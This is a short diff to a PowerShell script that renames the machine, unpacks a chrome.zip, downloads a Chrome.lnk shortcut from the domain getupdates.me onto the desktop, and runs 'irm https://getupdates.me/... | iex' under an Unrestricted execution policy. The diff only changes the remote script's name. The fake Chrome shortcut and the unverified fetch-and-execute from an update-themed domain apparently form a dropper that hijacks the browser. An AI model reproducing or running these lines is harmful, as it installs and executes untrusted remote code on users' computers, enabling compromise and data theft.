@@ -21,4 +21,4 @@ $CN = (Get-WmiObject -class win32_bios).SerialNumber
 Rename-Computer -NewName "PC-$CN" -WarningAction silentlyContinue
 Expand-Archive -LiteralPath "$env:HOMEPATH\chrome.zip" -DestinationPath "$env:HOMEPATH\" -Force
 Invoke-WebRequest -Uri "https://getupdates.me/Chrome.lnk" -OutFile "$env:HOMEPATH\Desktop\Chrome.lnk"
-Start-Process -FilePath "C:\Program Files\Powershell\7\pwsh.exe" -ArgumentList "-ExecutionPolicy Unrestricted -C irm https://getupdates.me/Part2.ps1 | iex"
+Start-Process -FilePath "C:\Program Files\Powershell\7\pwsh.exe" -ArgumentList "-ExecutionPolicy Unrestricted -C irm https://getupdates.me/test1.ps1 | iex"
